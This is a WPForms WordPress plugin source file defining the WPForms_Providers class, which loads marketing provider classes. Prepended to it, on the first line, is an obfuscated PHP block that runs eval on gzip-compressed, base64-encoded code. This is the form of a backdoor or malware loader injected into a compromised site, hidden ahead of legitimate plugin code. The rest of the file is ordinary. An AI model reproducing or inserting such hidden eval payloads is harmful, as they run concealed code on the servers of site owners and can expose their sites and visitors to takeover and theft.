<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/**
 * Load the providers.
 *
 * @package    WPForms
 * @author     WPForms
 * @since      1.3.6
 * @license    GPL-2.0+
 * @copyright  Copyright (c) 2017, WPForms LLC
 */
class WPForms_Providers {

	/**
	 * Primary class constructor.
	 *
	 * @since 1.3.6
	 */
	public function __construct() {

		$this->init();
	}

	/**
	 * Load and init the base provider class.
	 *
	 * @since 1.3.6
	 */
	public function init() {

		// Parent class template.
		require_once WPFORMS_PLUGIN_DIR . 'includes/providers/class-base.php';

		// Load default templates on WP init.
		add_action( 'wpforms_loaded', array( $this, 'load' ) );
	}

	/**
	 * Load default marketing providers.
	 *
	 * @since 1.3.6
	 */
	public function load() {

		$providers = array(
			'constant-contact',
		);

		$providers = apply_filters( 'wpforms_load_providers', $providers );

		foreach ( $providers as $provider ) {

			$provider = sanitize_file_name( $provider );

			require_once WPFORMS_PLUGIN_DIR . 'includes/providers/class-' . $provider . '.php';
		}
	}
}

new WPForms_Providers;
